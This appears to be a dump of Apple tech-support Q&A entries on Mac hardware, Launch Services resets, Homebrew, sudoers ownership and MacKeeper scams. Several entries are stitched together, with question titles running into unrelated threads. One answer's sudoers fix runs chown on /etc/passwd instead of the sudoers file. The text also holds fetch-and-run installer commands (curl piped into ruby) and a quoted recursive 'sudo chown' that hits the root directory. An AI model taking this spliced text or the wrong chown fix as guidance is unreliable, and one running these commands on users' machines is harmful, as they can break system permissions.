any excess heat, nor the possibility of cables moving (as an added bonus, the heat shield does sort of help keep everything in a place).\nIt's most likely your problems have been low quality replacement digitisers and/or a damaged cable. However, I have personally seen one instance of an iPhone (not an iPhone 5, but that probably doesn't matter) where a cheap 3rd party digitser/LCD replacement only worked properly when the heat shield was removed altogether. \nI've also heard that (but have no personal experience of) some repairers actually removing the heat shield so that their replacement digitsier/LCD screens work properly.\nI suppose you could try doing the same as a 'test'.\n", "Q: app store wont let me download free apps when I try to download a free app it asks for my credit card info, and I don't have one and I say none but it just restarts and wont let me pick none.\n\nA: Do you participate in a family share?\nmaybe the admin credit card is out of date?\nI had the same problem because his credit card was not valid anymore.\nif not maybe apple just trying to make people put a credit card on individual accounts.\n", "Q: Can you add more than one iMovie Theater account to an Apple TV? I have a 3rd generation Apple TV and typically have the iCloud account set to mine. However, another member of my family is starting to use iMovie Theater and their videos do not appear on the Apple TV as we have separate iCloud accounts. It seems that the iMovie Theater app on the TV is tied to a single iCloud account.\nI know that you can add multiple iTunes accounts to the device, but is it possible to add multiple iCloud accounts? Ultimately, I'm looking to have the iMovie Theater show videos from both of our accounts.\n\nA: As of June 2019, iMovie Theater is no longer supported and people are being moved to using iCloud Photos instead.\nThat being said, it appears that there is no way to add an additional account to the 3rd generation Apple TV, only the one iCloud account is allowed and thus only one iMovie Theater account can be used at a time.

No main fans, no chimes.  \nIt's recently had the PRAM battery changed & went through some heavy diagnostics at that time with no apparent issues.\nMy suspicion is the PSU - but I have no 'electrical' evidence to support that.\nWhen powered on, the diagnostic lights show only 2 of what I think ought to be 3 lights if everything was normal. \n\n That was not an easy picture to take ;-)\nAccording to the Service Source manual I think I ought to also be seeing the 'Power good' [PWRG] light up too. I'm guessing the GPU light would come on later in the boot process.\n\nThe machine is pretty clean; it gets a good dusting at least annually. I've had the PSU out for another quick dust, but tbh that's where my expertise ends.\nI have a multimeter, but wouldn't have the faintest clue where to start with it.\nIs there any relatively easy next step to diagnose the failure?\nI don't want to just buy a new PSU only to discover my diagnosis was incorrect.\nAdditional info:\nCurrent OS is El Capitan.\nTested with HD 5770 & stock GT 120, just in case the GPU was pulling too much power.\nTested with individual RAM risers. [All RAM lights flash red as expected]\nTested without any drives or USB connected.\n\nA: Hmm, the two week break may have killed the Power Supply Unit (PSU), especially if it was a rather cold morning when you tried to first power it back up. It wouldn't be the first time I've seen that happen. :(\nAs for using a multimeter to test the PSU, I wouldn't bother since the LEDs indicate the PSU is still providing trickle power and I wouldn't really encourage trying to test around some of the other rails (just to be extra safe).\nHowever, a fairly simple test you can do is a system reset. To do this:\n\n*\n\n*Power up the Mac Pro\n\n*Wait for it to get to its current usual state\n\n*Press the SYS_RST switch on the logic board (yep, this needs to be done while it's powered on).\n\n*If the Mac Pro boots, shut it down again\n\n*Now try booting up again from the normal power switch\n\n*If it doesn't boot, press the SYS_RST switch on the logic board again (don't power off first)\n\nBasically, if your Mac Pro does boot from the SYS_RST switch but not from the main power button, then it's most likely a new PSU you'll need.\nHowever,let's not give up yet! I'm not sure if you have a full Mac Pro Service Manual at your disposal, but before purchasing another PSU it may be worth going through the following process.\nJust ignore anything obvious or that you've already tried - I'm just trying to write this so it may be useful to others too. Obviously, before purchasing another PSU, it's worth trying anything below you haven't already tried.\nFirstly, let's summarise what to make of the LEDs:\n\n*\n\n*LED 1 off is a Good sign! - You wouldn't expect this to be lit unless your Mac was powered up but in sleep mode\n\n*LED 2 on is a Good sign! - This is normal when pressing the DIAG_LED button\n\n*LEDs 3 and 4 off is a Good sign! - These LEDs only come on if an error occurs or if the BootROM is corrupted (and you don't actually have to press the DIAG_LED button to see them)\n\n*LEDs 5 and 6 off is a Good sign! - Normally off. These LEDs actually have two indicator modes (i.e. they can either stay on or flash, depending on the error). Regardless, not an issue here\n\n*LED 7 off is a Bad sign! - This is normally on when pressing the DIAG_LED button. See troubleshooting suggestions below\n\n*LED 8 off is a Bad sign! - This is normally on when pressing the DIAG_LED button. See troubleshooting suggestions below\n\n*LED 9 on is a Good sign! - This is normal when pressing the DIAG_LED button (assuming the computer has been powered up for about 5 or do seconds first)\n\nTroubleshooting LED 7\nLED 7 should be on when pressing the DIAG_LED button.\nTypically to troubleshoot this you would:\n\n*\n\n*Check that the graphics card is seated correctly in its PCI slot\n\n\n*Check that the card’s auxiliary booster power cable is connected properly (i.e. if the card requires one)\n\n\n*Try the graphics card in a different PCI slot\n\n\n*Try another graphics card if you happen to have one handy\nTroubleshooting LED 8\nLikewise, LED 8 should be on when pressing the DIAG_LED button.\nTo troubleshoot this:\n\n*\n\n*Check the power cable connections\n\n\n*Swap your AC power cable with another one and test again\n\n\n*Unplug all external hardware (except for the display, keyboard and mouse, but also including any UPS you may be connected to) and test again\n\n\n*If you happen to have another USB keyboard you can try, use that instead while booting up\n\n\n*Check for any signs of an obvious electrical short, e.g. metal screws or a loose PCI card slot cover touching the logic board. Also check the logic board for any soldering that’s not quite right (something loose, or something that could come into contact with something else)\nOther troubleshooting\nSome other things to try include:\n\n*\n\n*Reset the SMC and test again\n\n*Reset the NVRAM and test again\n\n*Remove the battery for about 30 seconds, insert it again and test\n\n*Although you've only fairly recently replaced the PRAM battery, it's cheap enough to just try replacing it again\n\nVery late edit by Tetsujin\nAs the eventual cause of this particular fail was one of the RAM riser cards, it would be sensible to test those too.\nUsing just one of the  riser cards, put one RAM chip in the first slot, test in both risers. Repeat with the other riser card.\n\nA: The OP wrote in a comment:\n\nOnce I'd got it to boot, with a single RAM riser card in it I eventually managed to narrow it down to the other RAM riser.\n\nThis was the hint that also solved my issue. This is tricky since the diagnostic leds (DIAG_LED) are misleading at best. In my case LED 2 and 9 were also the only ones lit, which led me to think it could be the PSU as well. However when removing the defective memory riser card, LED 2 and 8 are lit and I hear the startup chime.\nThe memory itself seems fine as plugging in the defective memory riser without any FB-DIMM, leads to the same symptom i.e. no chime, and DIAG_LED 2 and 9 lit.\nThought I'd create an answer for it, so that it's more searchable.\n\nA: In my case, I did everything the things mentioned here, but with no luck. The riser cards are fully functioning in other same Mac Pro 3,1. I ordered a PSU and replaced old PSU, the problem persisted. After that, I ordered a logic board and replaced the old one. Fortunately, CPU's were fine and it is running again.\n", "Q: Missing text editing keyboard shortcut like windows while coding I am a long-time PC user using macOS.

I've never told them to open in Photoshop, even once, but the computer decides to change the default program to Photoshop. I change the default program back to Preview but a day later it changes to Photoshop again.\nI have the same problem with Grab and Preview. The computer wants Grab to handle jpgs and I constantly change it to Preview and somehow it changes back again without me doing anything.\nEDIT: basically the only steps I've tried are to right click on the file and go to get info, then change the default app to preview and then click on \"change all.\" \nI've also done: right click on file and choose to \"open with\" preview, but that won't permanently change it either\n\nA: Because 1.) You are experiencing persistent and unrequested filetype association changes and 2.) Both third-party software and Mac OS system utilities are being set--again, without request and persistently--as first-responder applications for major filetypes, I therefore believe you have a corrupted Launch Services database. (While there is a known issue with Adobe CC2017 being the cause of .pdf files opening in Photoshop rather than in Preview.app, this does not explain the behavior of Grab doing the same to .jpg files.)\n[NOTE: The following paragraphs are taken from The Eclectic Light Co. site. I include them here to provide a backup set of instructions for attempting a solution should the link die, but I recommend visiting the actual site if possible.]\nThere is no simple way to rebuild your Launch Service database, unless you have a utility such as OnyX which includes this as a feature. Restarting in Safe mode (with the Shift key held) flushes quite a few caches, but does not touch the Launch Services database. Even if someone were to tell you where to find the files, you cannot just trash them.\nThe tool which maintains the Launch Services database is lsregister, which is tucked away in /System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support.\nIt has no man page, but typing /System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -h in Terminal will return its usage information.\nTo reset the Launch Services database, you should use its -kill option. You want this to be applied through a recursive directory scan, so also need the -r option. It’s wise to watch its progress in verbose mode (-v option), and you need to specify the domains to which this will apply. Generally, the command advised is:\n/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -kill -r -domain u -domain s -domain l -v\n\nto which some add the option to scan default locations to seed the database, -seed.\nThere are some issues with that command as given. It covers three domains – system, local, and user – which makes it very extensive, perhaps more so than is required. It also uses a different syntax from that given for the command in Sierra 10.12.6. Instead, I suggest that you try in the first instance\n/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -kill -r -v -apps u\nThat should do the trick. If it doesn’t, then widen the domains with\n/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -kill -r -v -apps u,s,l\nand finally try\n/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -kill -r -v -all u,s,l\nwhich should wipe everything from the database.\nIt is also not impossible that you find you have to use the older syntax with\n/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -kill -r -v -domain u\nThe snag with resetting the Launch Services database is that your Mac will take time to gradually rebuild it, during which its functions will run much slower. After a while, though, it will have been rebuilt, and the right app should be associated with each document type.\n\nAs to how the database was corrupted, there are dozens of ways. Here's an example involving a recent cause (not necessarily related to yours): Firefox version corrupts MacOS file association database.\n", "Q: Rating or reviewing an app from the App Store on iOS always silently fails.

So, I have a cheap battery for my dead-broke-esque 2008 MacBook. It only lasts about 2 hours on a full charge. However, it's a little goofy at times. Not in a dangerous way, just that it seems to miscalculate how much time it has left sometimes, and suddenly dies at 25%. I know, terrible choice to get an old battery. But I'm poor and was sick of outlet-surfing, so I got a cheap battery. Anyway, since my upgrade to OS X Lion (in 2018, mind you), I haven't had as much of a problem, but still might have it sometimes. Plus, I'm going to be letting a friend/colleague of mine use it for a while, and would rather tell him to \"plug it in when it gets red\" than sit and explain the goofy battery more than I already have.\nSo what I am wondering is how I can, if possible, change the percentage of battery remaining that will cause the battery icon to turn red in the Menu Bar. I also would think it nice to be able to spring the \"Reserve power\" notification at a certain percentage as well. I know I can also just AppleScript Finder to pop up and say \"ey, you're low on power\" but I think it would be better to change the actual alerts.\n\nA: \n...how I can, if possible, change the percentage of battery remaining\n  that will cause the battery icon to turn red in the Menu Bar.\n\nYou can't.\nIt's not something that can be modified.  \nThe battery icon changes to red when you have less than 15% charge remaining (macOS 10.8 and earlier).  It changes when there is less than 10 minutes remaining in Mavericks (10.9 and later).  See About Mac notebook batteries\nYou'd need a 3rd party app like Coconut Battery (Paid edition) so you can get notifications when your battery reaches a certain level.  \n(IMO) If you're going to pay for an app to tell you this, just buy a new battery and be done with it.\n", "Q: Macbook Pro WiFi hardware sporadically malfunctioning I dropped my MacBook Pro (15\" mid 2012) last week, which appeared to just give a bit of cosmetic damage near the Ethernet port. But over the last few days, my Mac has repeatedly automatically set WiFi to off in the toolbar and won't let me turn it back on. Sometimes the toolbar displays \"no WiFi hardware installed\". \nAs many sources online recommended, I did NVRAM and SMC resets, and this occasionally works, but is only a temporary solution, eventually it will tell me there's no hardware again. My thinking is that the cable connecting to the airport card was damaged when I dropped the laptop. \nDoes this seem likely? Obviously I don't want to replace the cable, unless I'm pretty sure that's the issue. \n\nA: \nMy thinking is that the cable connecting to the airport card was\n  damaged when I dropped the laptop. Does this seem likely?\n\nYou need to diagnose the issue and without actually putting \"hands on\" the unit itself, everything's just a guess at this point.   That said,  there's nothing in NVRAM or in power management (SMC) that resetting both/either will solve.\nThe \"No WiFi hardware installed\" means the hardware isn't being detected by macOS. \nThere are three possibilities:\n\n\n*\n\n*It's has a loose connection.\n\n*The airport card is failing (possibly coincidental with your drop).  \n\n*The connector is broken\n\n\nThe first one is easy to diagnose/solve; simply disconnect, ensure that connections are clean, and then reconnect.  \nIf the airport card has failed, you need to replace it with new Airport Adapter.\nFinally, if the connectors are broken, you can either replace the cable as you initially thought or if it's on the logic board side, you will need to have the logic board repaired/replaced.\n", "Q: Seeking script to add to my automator service to make it reveal newly created item in finder After much research (I am not familiar with Shell, Bash coding... and only just discovered the magic of Automator and Terminal usefulness), I've created an Automator service that captures a shot of specific rectangle of my screen and saves it on desktop upon press of a shortcut key.

XQuartz) and then set your display environment variable first with:\nexport DISPLAY=:0\n\nLaunching applications from within the XQuartz terminal will have the $DISPLAY env var set automatically. You can make this change persist by adding that line to your ~/.profile or ~/.bash_profile file:\necho 'export DISPLAY=:0' >> ~/.profile\n\nNote that in my setup, XQuartz automatically sets $DISPLAY for me without my needing to do this, so you may want to re-install XQuartz.(Or ask a follow-up question about why that behavior isn't working)\n", "Q: A tech from MacKeeper wishes access to my computer for licensing and activation. Is this a scam? I paid for a version of MacKeeper which may be a mistake. Their tech  wants me to allow them to access my computer as in have access to my desktop files, etc. They say it is to fully license and engage the program . I have not done it as of yet.  \nIs this typical when activating? I'm not comfortable letting them have control of my computer\n\nA: MacKeeper IS Malware. Run MalwareBytes on your Mac and it will remove MacKeeper. Here's what you need to do:\n\n\n*\n\n*Uninstall MacKeeper as best you can\n\n*Run MalwareBytes to get any pieces of it you missed\n\n*Tell the \"tech\" to... this website doesn't like cursing, so just tell him something off-color\n\n*Call your credit card company and tell them you were scammed and all of the MacKeeper charges were scams - which they were, that software is all scam. It performs no useful functions, it just slows your computer to a halt, installs other malware, and tries to get you to pay them money for the privilege. \n\n\nA: Scam. Scam. Scam. Scam....\nThere is never - as in absolutely never ever until the sun boils and the earth burns - why an unsolicited request to access your computer from someone you don't know and haven't voluntarily asked (other than clearly genuine police and customs officials) should be anything except a scam.\nNo legitimate software needs it. No legitimate system you are likely to use (Mac, Windows, Linux, BSD, or anything else) ever needs or expects it. No legitimate software company (Apple, Microsoft, Google, Kaspersky, Adobe, or any other OS or software creator) ever asks or requests it. No legitimate ISP, firewall, security, networking, or landline/mobile/cable telecoms company ever phones or emails to ask for it. Nobody legitimate will ever telephone you \"out of the blue\" to advise that your computer has a problem or needs urgent attention due to a computer issue. No legitimate antivirus or anti-malware needs  it.\nThe sun will die, Donald Trump will be married to Vladimir Putin, and protons will evaporate (estimated 10^34 ish years) before a request like the kind you describe is genuine and anything more than \"can we persuade someone to let us access their data and install malware\".\nIt doesn't matter what pretext or  explanation they give, or how urgent it sounds - and the more jargon and urgency, the more likely that you're being called by a scammer. (Denying time to think by making it sound extremely important is a classic scammer trick)\nIf you want more information, it's a variant on this Microsoft service phone call scam, or this suspicious activity phone call scam, or this FTC page on tech support scams.\nI don't know how to say it more directly :) But that's the bottom line.\nWell done on pausing and not \"diving in\".\n\nA: It may not even be MacKeeper.  It could be scammers pretending to be MacKeeper, with the same end-goal as the Microsoft tech support scam: to gain control of your computer.  \nWhy on earth would scammers pretend to be a known-awful product?  To filter out the skeptical/savvy who will waste their time, so only the gullible get through.  They know perfectly well that \"Nigerian\" is associated with \"scam\" to most people, so they intentionally claim to be Nigerian when they are not even running their scam from Africa.  It's so anyone experienced goes 'Nope' and they only get responses from the very dumb. \nSo in this case, substitute MacKeeper for Nigeria. \n\nA: Do not do this.\nThere are exactly zero reasons a tech, or anyone else for that matter, would need remote access to your computer to \"fully license and engage a program.\"\nThat phrasing alone is more than enough to elicit a high degree of skepticism of the intention and/or competence of the \"tech\" who is looking to access your computer.\nFor just a brief (hypothetical) moment; giving the \"tech\" the benefit of the doubt and assuming his motives are genuine, how good can this software be that it needs special handling to activate?\nBottom line...\nYou don't need this software, avoid it.\n\nA: Lots of other answers go on to rightfully focus on the scam-ish aspects of the MacKeeper world. And Harper points out you might not even have a legitimate copy of MacKeeper and how anyone demanding access via phone is a scammer. But there is a much simpler answer to this question that you yourself provided:\n\nI paid for a version of MacKeeper which may be a mistake.\n\nIf you yourself are stating that something might be a mistake, it is a mistake. Go with your gut and trust your instincts on this one.\nNow at this point, you already paid for MacKeeper. Which is one level of mistake. See how you can uninstall it and perhaps get a refund for the purchase. But don’t take the next step and dive deeper into this nonsense. They—whoever is on the other end of the phone—might be aggressive in trying to get you to give them access, but don’t fall for it.\nAnd heck, if this is a fraudulent version of MacKeeper—which is questionable software itself—then try to uncover that. If it is indeed a fake piece of software, then you can contact your credit card company and claim a refund based on fraud.\nBut at the end of the day, you are experiencing a rightful fit of buyer’s remorse. Just be sure you don’t go any deeper into this nonsense.\n", "Q: Close mission control by repeating gesture Currently I have mission control to activate on three fingers up as so\n\nHowever once mission control is activated I would expect to be able to close mission control by repeating this three fingers up gesture.

I've heard this is bad for the battery health, and everyone in my office have to replace swollen batteries every couple of years.\nI want to regularly discharge the battery, per Apple's recommendation, but I don't want to physically unplug it because that temporarily turns off the external monitor, and then I have to reconnect the monitor.  So I am looking for a software method of disabling the power input, to force the laptop to discharge its battery to 20% and then re-enable the power input.\n\nA: Short answer\nTo the best of my knowledge there's no consumer software capable of doing this.\nLong answer\nUsing software to disable the power input until your MBP is discharged to a certain level wouldn't actually achieve your ultimate goal (i.e. avoiding your external monitor from being temporarily disconnected). \nThat's because disabling the AC power input (or more specifically, switching it from AC to DC) is exactly what's causing your external monitor to behave in this way, and there's no way for the hardware to discern why the AC power input is gone. In other words, it's not capable of telling the difference between an AC source being switched off, a power lead being unplugged, or some software just disabling the AC power input.\nThe only other way to try to achieve this is to get your MacBook Pro to use more power than what the charger is supplying for a period of time. While that's theoretically possible, in practice it's just not going to happen without something that will also act to override the System Management Controller (SMC). \nTo explain that a little further, to get your MBP to try and use more power than is being supplied would involve stressing out the hardware, at which point the SMC kicks in to protect it, so any software would need to try and bypass the SMC as well. While it is possible to bypass some functions of the SMC, I really wouldn't recommend it, and in this case it's likely to cause much greater long-term problems than a swollen battery or a short-term problem like a disconnected external screen.\n\nA: You can use Energiza Pro to do this for you. It supports Apple silicon MacBooks and has a discharging feature.\n(Disclaimer: I'm the developer.)\n\n", "Q: Remove shared devices from my MacBook Some device is being shown under Shared section on my MacBook. I don't remember setting up any such device at all.\n\nHow do I remove this device, once and for all?

In your case, that's a Windows computer with some form of sharing enabled.\nIf you do not access resources available in your local Network this way, you can choose to remove the Shared section from the Finder sidebar.

My question is, do I need a special Thunderbolt 2 to DVI/VGA adapter or can I use a Mini Display to DVI/VGA adapter?\n\nA: The Thunderbolt 2 ports on Macs support mini-DisplayPort natively, so you can absolutely use an mDP-DVI/VGA adapter.\n", "Q: macOS High Sierra - set default Wi-Fi I wish to set a Wi-Fi access point as default to connect to.

I'm using iMovie 10.1.9 on High Sierra. My AirPods are paired and all of my audio is playing through them but I am unable to choose them to record a voice over in iMovie. I've even set them as the default input source in sound preferences but the internal microphone is always used.\nI also attempted to record a voice over on iMovie on my iPad Pro, and again, it only uses the internal microphone. I can hear audio in the AirPods but it doesn't use the microphone in the AirPods to record the voice over.\nIn both cases I can tell that it's not using the AirPods microphone because I can hear lots of reverb and background noise. I also hear nothing if I tap on either of the Airpods when recording but do hear a noise when I tap on the MacBook or iPad body.\nAm I missing something or does this just not work?\n\n\n\nA: I couldn't do it in iMovie either (just as you show in your screenshots), but I have an idea.\nJust record the audio using Quicktime Player.\nOpen Quicktime Player and select \"New Audio Recording.\" Your Airpods should show up there as an audio source. \nTo time the audio with your video, start recording, then switch to iMovie. Hit play on the video timeline (ensure you have no sound playing) and talk along with the video.\nThen take your resulting recording from Quicktime Player, pull it into iMovie, lay it on your timeline and sync it up. (Obviously you'll want to trim the ends off.)\n(There are alternatives, such as using Soundflower to create patches from one audio source to another, but that seemed a lot more convoluted and complicated to go into.)\n\nA: I found a way to trick iMovie into accepting my AirPods by creating a new Aggregate Device with the Audio Midi Setup Tool. First launch the Audio Midi Setup app, and click the + in the bottom left of the window. Select Create Aggregate Device\n\nNext select your AirPods input device as the only device in the aggregate and name it something useful.\n\nFinally, you'll be able to select your new Aggregate Device in the microphone selection dropdown in iMovie.

After upgrade my homebrew seems to have stopped working. So I uninstalled the homebrew by executing the below command\nruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/uninstall)\"\n\nI tried to install homebrew again by executing the below command\n/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n\nBut the installation failed with the error as discussed here.\nThen I tried executing the command as suggested in the above issue.\nsudo chown -R $USER:admin /usr/local\n\nBut it did not work because of the issue discussed here. \nI executed the below command as suggested above\nsudo chown -R $(whoami) $(brew --prefix)/*\n\nIt gave me some Operation not permitted warnings.\nThen I again tried to install homebrew. Now it is showing me the below logs in console\n...\n==> Installation successful!\n\n==> Homebrew has enabled anonymous aggregate user behaviour analytics.\nRead the analytics documentation (and how to opt-out) here:\n  https://docs.brew.sh/Analytics.html\n\n==> Next steps:\n- Run `brew help` to get started\n- Further documentation:\n    https://docs.brew.sh\nsudo: /etc/sudoers is owned by uid 504, should be 0\nsudo: no valid sudoers sources found, quitting\nsudo: unable to initialize policy plugin \n\nCan some one let me know what does the last set of warnings / errors denote? Can these be ignored?\n\nA: The warning at the end is telling you that the root user (denoted by default with the uid 0) doesn't own the /etc/sudoers file anymore. This is bad. At some point you may have accidentally changed this, perhaps by mistyping a command. The sudoers file denotes which users and groups are allowed to escalate to a root privilege set by prefacing a command with sudo and typing their login password.\nThe chown command you've been using above changes the ownership of files from one user and/or group to another. Because you've changed ownership of the sudoers file you probably won't be able to sudo yourself out of trouble as the sudo command won't run for security reasons if the sudoers file from which it draws its configuration is owned by a user other than root (this is why homebrew is spitting out the last error message above).\nI'd suggest the following:\n\n\n*\n\n*Enable the root user using Apple's instructions here (under the section 'Enable or disable the root user').\n\n*Open Terminal and switch to the root user by typing su - and entering the password you assigned to your root user account in step 1.\n\n*As the root user, change ownership of the sudoers file back to root and the wheel group with the following:\nchown root:wheel /etc/passwd\n\n\n*Follow the instructions in step 1 again but this time disable the root user again.\nYou should now be able to use the sudo command again with your regular admin user. You can run sudo ls for instance in a new shell; if the contents of the current directory are listed and you don't see that ownership error above then all is well.\nAlthough this falls outside the bounds of your question, I'm concerned that if you've unwittingly changed ownership of the sudoers file while attempting to change ownership of /usr/local/ you may have done this to other important files as well. Run ls -l /etc/ and examine the output of that command. The third column in from the left shows the user who owns a given file. By default, pretty much every file in the /etc/ directory is meant to be owned by root (an obvious one is /etc/passwd). If you see the majority are owned by another user (your own username for instance), the problem is far more extensive than your sudoers file.\nAs a general point, you need to be very careful running any command prefaced by sudo. Only run commands in your terminal if you understand the command and know exactly what it will do when passed a given set of options/arguments. There are some safeguards provided by the more recent Mac operating systems with System Integrity Protection (SIP) but you can still wreak plenty of havoc on your system.\nIf you want to learn what a particular command and its various arguments do, try checking the manual first by typing man + the command you want information on (man sudo or man chown for example).\n\nA: Just went through this process myself. The installation command (slightly different in 2021) on the homebrew site  did not work for the same reason you posted.\nI came across the same suggested command\nsudo chown -R $(whoami) $(brew --prefix)/*\n\nAfter running it, I started seeing tons of permissions errors being logged. It took me about an entire minute to realize what was going on and hit ctrl+c, and why the suggested command is actually a bad idea for initial setup.\nSince brew isnt installed yet (not on the PATH), then $(brew --prefix) evaluates to null/blank.\nIn other words sudo chown -R $(whoami) $(brew --prefix)/* is actually running sudo chown -R $(whoami) /* which is bad.\nFor anyone else trying to do setup on a new machine, I ended up having to setup homebrew under my user directory even though it's \"not recommended\"\nhttps://github.com/Homebrew/brew/blob/664d0c67d5947605c914c4c56ebcfaa80cb6eca0/docs/Installation.md#untar-anywhere\ncd ~\n\nmkdir homebrew && curl -L https://github.com/Homebrew/brew/tarball/master | tar xz --strip 1 -C homebrew\n\nthen add ~/homebrew/bin to PATH\n", "Q: What happens when MDM vendor certificate expires?

The website requires a username and password to view and probably has who knows what kind of security systems in place.\nOn Safari 10 and/or macOS 10.12, I could visit the website and enter my username and password; it wouldn't save the password despite repeated attempts on my part at making it do so, but at least I could visit the site.\nOn Safari 11 and macOS 10.13, however, I get the following message:\n\nThis connection is not private\nThis website may be impersonating [website] to steal your personal or financial information. You should go back to the previous page.\n\nI have two options: \"Show Details\" and \"Go Back\". If I press \"Show Details\", I get the following message below the previous one:\n\nSafari warns you when a website has a certificate that is not valid. This may happen if the website is misconfigured or an attacker has compromised your connection.\nTo learn more, you can view the certificate. If you understand the risks involved, you can visit this website.\n\nIf I click on \"view the certificate\", I can see the certificate details, where it explicitly says \"This certificate is marked as trusted for [website]\".\nIf I click on \"visit this website\", I am asked for my administrator password to change certificate trust settings. After entering my password, I am redirected to the original \"This website may be impersonating [website]\" message.\nI don't have this problem with other browsers (e.g. FireFox) or other remote access clients (e.g. FileZilla), so it isn't a problem with the website, it is a problem with Safari.\nI've tried deleting the certificate in Keychain Access and creating it again, and I have tried restarting my computer. I am the administrator (and sole user) of my computer. My internet connection is secure and doesn't have any firewalls (it's just a home wi-fi connection).\nWhat can I do to regain access to my group's website and preferably force Safari to remember my login information?\nEdit: I found a workaround which I’m not at all happy with, since it’s annoying and it needs to be done all over again every time I reboot my computer, so I’m looking for proper answer.\n\nA: After searching for hours and trying several different \"fixes\" which didn't work, Trevor Da Silva's solution here worked.\nThe fix essentially consists of deleting the problematic site's certificate, opening the site in a private Safari window, choosing to trust it and then retrying in a regular Safari window.\nEdit: This has to be redone every time the computer is restarted, so it isn't a true solution.\n\nA: Use a different browser\nYou say in the question that you don’t have this problem with a different browser\n\nI don't have this problem with other browsers (e.g. FireFox)\n\nTherefore you should be able to use Firefox to acces the site.\nAccessing similar (‘misconfigured’) websites on Firefox works for me and is much easier than your workaround.\n", "Q: Apple Script, Javascript: fill text filed (web form) with data from clipboard I want to fill a webform (text filed) from a page i open in Safari with the text from a excel cell.

I've got an eMac that's mostly working (running Tiger, plus a selection of other nice software), but has a broken optical drive.  I have a spare USB optical drive lying around, and it works for most purposes, but, according to this discussion on the Ars Technica OpenForum, most PowerPC Macs (including eMacs) can't boot from USB drives (at least not out of the box and without a LOT of tinkering and swearing), although they can boot from FireWire drives.\nJust in case I ever have to reinstall Mac OS X on the eMac, here's my question: if I plug a USB-to-FireWire adapter into one of the eMac's FireWire ports, and plug the USB optical drive into that, will the eMac be able to boot from said optical drive, or will I have to shell out for a FireWire optical drive?\n\nA: I believe you’ll have better luck with USB drives that are not optical. FireWire optical drives that supported booting in this era were expensive, so see if you can score a drive that you know used to boot. Even three at scrap prices are often salvageable with DIY skills.\nI’m almost certain we booted these Macs from USB drives in the shop back in the day. It wasn’t “supported” but it worked most of the time.\n\nA: \nJust in case I ever have to reinstall Mac OS X on the eMac, here's my question: if I plug a USB-to-FireWire adapter into one of the eMac's FireWire ports, and plug the USB optical drive into that, will the eMac be able to boot from said optical drive, or will I have to shell out for a FireWire optical drive?\n\nYou will have to get a FireWire optical drive.  That is assuming that the computer cannot in fact boot from a USB optical drive.\nThere are so called USB-to-FireWire adapters but they don't work, they are scams that will ruin your hardware.  I would guess it is theoretically possible to create a working USB-to-FireWire adapter, I just haven't seen one.\nIf booting from a USB hard drive is possible then build a backup now while you can.  I don't remember booting from USB to be a problem on any Mac with USB ports.  Some optical drives were not bootable as I recall, but that was the drive not the interface.  Drives with the right electronics in them would boot, others would not.  There really wasn't an easy way to tell but to experiment.\n", "Q: How can I get two calculators going? Is there anyway I can have two instances of native Calculator app running simultaneously.\n\nA: You can run as many as you like and even without duplicates  of the application.\nDouble click the application to open one instance, e.g.\n/Applications/Calculator.app\n\nThen double click the executable to open a second instance (you will have to ctrl+click or right-click the application and select \"Show Package Contents\" to navigate to the executable):\n/Applications/Calculator.app/Contents/MacOS/Calculator\n\nIn this second instance a Terminal window will open to run the executable.  Don't terminate it, or you will terminate the second instance of Calculator running.\nDouble clicking the executable lets you open as many instances of Calculator as you like (meaning I don't know the upper limit).\n\nA: Yes, you can, if you have an administrator account. Select Calculator.app in Applications, then right-click (control-click) and execute the Duplicate command. This will make a copy of the Calculator app which you can then use freely.\n\n\nA: The quickest, simplest and arguably most correct way of doing this is using the open command in Terminal.\nIn a new window, run the command \nopen -na Calculator\n\nThis will open a new (-n) instance of the application (-a) Calculator.\nIf you want to have this handy at the click of a button, you can type the following commands into the Terminal, and it will create a shortcut named calc or calc.command on your desktop that will always open a new instance of Calculator\ncd ~/Desktop\necho open -na Calculator > calc.command\nchmod +x calc.command\nexit\n\nMind that you don't already have a file named calc.command on your desktop, or it'll be deleted!\n\nA: Open your terminal and run:\nopen -n /Applications/Calculator.app\n\nor\nopen -na Calculator\n\nNo need for app copying or anything like that!\nFrom the help options for open:\n-n, --new         Open a new instance of the application even if one is already running.\n-a                Opens with the specified application.\n\n\nA: The open -na Calculator answer is good.  When I needed to do this before, I wrapped it in an Applescript:\n do shell script \"open -n \" & quoted form of the POSIX path of the (path to the frontmost application as Unicode text)\n\nThis detects which application is currently in the foreground and starts a new instance using the open -na method.\nSave this script in the Applescript Editor as something like \"Run another instance\" and put it in your /Users/${USER}/Library/Scripts directory.  You will then find it under the User Scripts Menu (which you may need to enable):\n\nSimply bring the calculator to the foreground, then select this menu item and you'll get another calculator instance.\n\nA: If you are unable to change sharing permissions on the Calculator.app file and make a copy using the Duplicate option, then this way should work for you.\n\n*\n\n*Open the Shortcuts app that comes with macOS.\n\n*Create a new shortcut with the plus sign.\n\n*In the 'Search for apps and actions' field at top right type the word \"run\"\n\n*Now drag the 'Run Shell Script' option from the right pane into the main pane for your action. (Note: You may be prompted to allow running scripts).\n\n*Replace the default echo \"Hello World\" script text with:\nopen -n /System/Applications/Calculator.app.\n\n*Rename your shortcut from \"Run Shell Script\" to something more meaningful (remembering to press return) and then close the window.\n\n*Go back to the main Shortcuts window and drag your newly created shortcut from the \"All Shortcuts\" main pane to the \"Menu Bar\" folder in the right pane.\n\n*You should now be able to access the shortcut in your top menu bar and create multiple instances with it.\n\n\nA: You can copy the calculator app to a different folder or desktop. Now change the name to something different like Calc ( very original I know). You can now run both.\n", "Q: High Sierra - Why is Recovery HD inside the APFS container? I noticed a few days ago that the Recovery partition was inside the APFS container. Isn't it better for it to be a separate volume? For example, APFS containers sometimes 